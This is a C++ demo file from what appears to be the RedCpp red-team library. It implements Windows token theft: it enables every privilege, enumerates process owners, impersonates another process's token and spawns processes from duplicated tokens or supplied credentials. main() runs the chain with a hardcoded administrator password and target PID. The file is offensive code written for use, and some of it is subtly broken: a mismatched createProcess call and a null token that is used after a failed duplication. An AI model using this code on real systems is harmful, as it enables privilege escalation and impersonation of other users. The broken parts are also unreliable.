/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include <iostream>
#include "../lib/token.h"
#include "../lib/process.h"

void whoami()
{
    Token* token = getCurrentToken(TOKEN_READ);

    if (token == NULL)
    {
        printf("Failed to get current token\n");
        return;
    }

    char* username;
    char* domain;
    int res = token->getTokenUser(&username, &domain);
    if (res != 0)
    {
        printf("Failed to get token user: %d\n", GetLastError());
    }
    else
    {
        printf("Current user: %s\\%s\n", domain, username);

        free(username);
        free(domain);
    }

    std::list<Privilege>* privs_list = token->getTokenPrivs();
    if (privs_list == NULL)
    {
        delete(token);

        printf("Unable to get privileges information\n");

        return;
    }

    printf("Privileges:\n");
    for (std::list<Privilege>::const_iterator iterator = privs_list->begin(), end = privs_list->end(); iterator != end; ++iterator) {
        printf("- %s     ", (*iterator).name.c_str());
        if ((*iterator).enabled)
            printf("ENABLED,");
        if ((*iterator).enabled_by_default)
            printf("ENABLED_BY_DEFAULT,");
        if ((*iterator).removed)
            printf("REMOVED,");
        if ((*iterator).used_for_access)
            printf("USED_FOR_ACCESS");
        printf("\n");
    }

    delete privs_list;

    delete token;
}

void enable_privilege(const char* privilege)
{
    printf("Enabling privilege %s\n", privilege);

    Token* token = getCurrentToken(TOKEN_ADJUST_PRIVILEGES);
    if (token == NULL)
    {
        if (GetLastError() == ERROR_ACCESS_DENIED)
        {
            printf("Unable to get our token: ERROR_ACCESS_DENIED\n");
        }
        else
        {
            printf("Unable to get our token: %d\n", GetLastError());
        }

        return;
    }

    int res = token->enablePrivilege(privilege);
    if (res != 0)
    {
        delete(token);
        printf("Unable to set privilege %s: %d\n", privilege, GetLastError());

        return;
    }

    delete(token);

    printf("Successfully enabled privilege %s\n", privilege);
}

void enable_all_privileges()
{
    Token* token = getCurrentToken(TOKEN_READ);

    if (token == NULL)
    {
        printf("Failed to get current token: %d\n", GetLastError());
        return;
    }

    std::list<Privilege>* privs_list = token->getTokenPrivs();
    if (privs_list == NULL)
    {
        delete(token);

        printf("Unable to get privileges information\n");

        return;
    }

    for (std::list<Privilege>::const_iterator iterator = privs_list->begin(), end = privs_list->end(); iterator != end; ++iterator) {
        if (!(*iterator).enabled)
            enable_privilege((*iterator).name.c_str());
    }

    delete privs_list;

    delete token;
}



void list_processes()
{
    std::list<Process*>* process_list = enumerateProcesses(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);

    printf("Processes:\n");
    for (std::list<Process*>::iterator iterator = process_list->begin(), end = process_list->end(); iterator != end; ++iterator)
    {
        Process* process = *iterator;
        int pid = process->getPID();

        std::string* process_name = process->getProcessName();
        if (process_name == NULL)
        {
            process_name = new std::string("<Unknown>");
        }

        std::string dom_user = std::string("");

        Token* token = process->getToken();
        if (token == NULL)
        {
            dom_user = "Unknown user";
        }
        else
        {
            char* username;
            char* domain;
            int res = token->getTokenUser(&username, &domain);
            if (res != 0)
            {
                dom_user = "Unknown user";
            }
            else
            {
                dom_user = std::string(domain) + "\\" + std::string(username);

                free(username);
                free(domain);
            }

            delete token;
        }

        printf(" - [%d] %s\t\t%s\n", pid, process_name->c_str(), dom_user.c_str());

        delete process_name;
        delete process;
    }

    delete process_list;
}

void impersonate_user(const char* domain, const char* username, const char* password)
{
    Token* token = createToken(domain, username, password);
    if (token == NULL)
    {
        printf("Unable to create token: %d\n", GetLastError());

        return;
    }

    int a;
    int b;
    ULONG c;
    token->getTokenType(&a, &b, &c);

    int res = token->impersonate();
    if (res != 0)
    {
        delete(token);

        printf("Unable to impersonate user: %d\n", res);

        return;
    }

    delete(token);

    printf("Impersonation success\n");
}

void revert_to_self()
{
    BOOL res = RevertToSelf();
    if (!res)
    {
        printf("RevertToSelf failed: %d\n", GetLastError());

        return;
    }

    printf("RevertToSelf success\n");
}

void impersonate_process_token(int pid)
{
    Process* process = getProcessByPID(pid, PROCESS_QUERY_INFORMATION);
    if (process == NULL)
    {
        if (GetLastError() == ERROR_ACCESS_DENIED)
        {
            printf("Unable to open the process: ERROR_ACCESS_DENIED\n");
        }
        else
        {
            printf("Unable to open the process: %d\n", GetLastError());
        }

        return;
    }

    Token* token = process->getToken(TOKEN_READ | TOKEN_DUPLICATE);
    if (token == NULL)
    {
        delete(process);

        if (GetLastError() == ERROR_ACCESS_DENIED)
        {
            printf("Unable to get the process token: ERROR_ACCESS_DENIED\n");
        }
        else
        {
            printf("Unable to get the process token: %d\n", GetLastError());
        }

        return;
    }

    int a;
    int b;
    ULONG c;
    token->getTokenType(&a, &b, &c);

    int res = token->impersonate();
    if (res != 0)
    {
        delete(process);
        delete(token);

        printf("Unable to impersonate user: %d\n", res);

        return;
    }

    delete(process);
    delete(token);

    printf("Impersonation success");
}

void spawn_process_from_process(int pid, const wchar_t* application)
{
    Process* process = getProcessByPID(pid, PROCESS_QUERY_INFORMATION);
    if (process == NULL)
    {
        if (GetLastError() == ERROR_ACCESS_DENIED)
        {
            printf("Unable to open the process: ERROR_ACCESS_DENIED\n");
        }
        else
        {
            printf("Unable to open the process: %d\n", GetLastError());
        }

        return;
    }

    Token* token = process->getToken(TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);
    if (token == NULL)
    {
        delete(process);

        if (GetLastError() == ERROR_ACCESS_DENIED)
        {
            printf("Unable to get the process token: ERROR_ACCESS_DENIED\n");
        }
        else
        {
            printf("Unable to get the process token: %d\n", GetLastError());
        }

        return;
    }

    Token* newToken = token->duplicate();
    if (newToken == NULL)
    {
        printf("Unable to duplicate token\n");
    }

    int res = newToken->createProcess(application);
    printf("createProcess: %d\n", res);
}

void spawn_process_from_login(const char* domain, const char* username, const char* password, const wchar_t* application)
{
    Token* token = createToken(domain, username, password);
    if (token == NULL)
    {
        printf("Unable to create token: %d\n", GetLastError());

        return;
    }

    Token* newToken = token->duplicate();
    if (newToken == NULL)
    {
        printf("Unable to duplicate token\n");
    }

    int res = newToken->createProcess(application);
    printf("createProcess: %d\n", res);
}

int main()
{
    whoami();

    printf("\n==========================================\n\n");

    enable_all_privileges();

    printf("\n==========================================\n\n");

    whoami();

    printf("\n==========================================\n\n");

    list_processes();

    printf("\n==========================================\n\n");

    createProcess(L"Workgroup", L"administrator", L"Passw0rd!", L"C:\\Windows\\System32\\cmd.exe");

    printf("\n==========================================\n\n");

    impersonate_process_token(1288);

    whoami();

    list_processes();

    revert_to_self();

    while (true)
        Sleep(1000);
}